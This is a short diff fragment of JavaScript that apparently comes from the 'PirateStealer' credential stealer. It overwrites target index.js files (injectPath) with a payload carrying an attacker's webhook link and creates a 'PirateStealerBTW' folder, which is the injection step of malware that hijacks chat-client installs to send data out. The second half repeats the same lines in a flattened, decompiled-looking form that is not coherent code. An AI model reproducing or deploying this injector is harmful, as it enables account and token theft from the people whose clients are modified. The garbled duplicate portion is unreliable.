@@ -1,0 +1,19 @@
+injectPath.forEach(file => {
+                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook), {
+                    encoding: 'utf8',
+                    flag: 'w'
+                });
+                let folder = file.replace("index.js", "PirateStealerBTW")
+                if (!fs.existsSync(folder)) {
+                    fs.mkdirSync(folder, "0744")
+                }
+            })
+fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook), {
+                    encoding: 'utf8',
+                    flag: 'w'
+                })
+_tmp_41.encoding = "utf8"
+_tmp_41.flag = "w"
+let folder = file.replace("index.js", "PirateStealerBTW")
+!fs.existsSync(folder)
+fs.mkdirSync(folder, "0744")
